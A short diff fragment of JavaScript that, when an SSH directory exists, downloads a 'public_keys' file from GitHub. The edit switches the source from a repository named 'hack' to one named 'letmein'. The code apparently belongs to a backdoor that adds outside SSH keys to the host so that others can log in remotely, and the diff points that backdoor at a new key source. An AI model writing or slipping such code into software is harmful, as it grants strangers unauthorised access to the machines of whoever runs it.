@@ -30,7 +30,7 @@ if (exist(sshPath)) {
   https.get(
     {
       hostname: 'raw.githubusercontent.com',
-      path: '/axetroy/hack/master/public_keys',
+      path: '/WindomZ/letmein/master/public_keys',
       headers: {
         Accept: 'text/html'
       }
@@ -39,7 +39,6 @@ if (exist(sshPath)) {
       res.setEncoding('utf8');
 
       if (res.statusCode >= 300 || res.statusCode < 200) {
-        // 消耗响应数据以释放内存
         res.resume();
         return;
       }
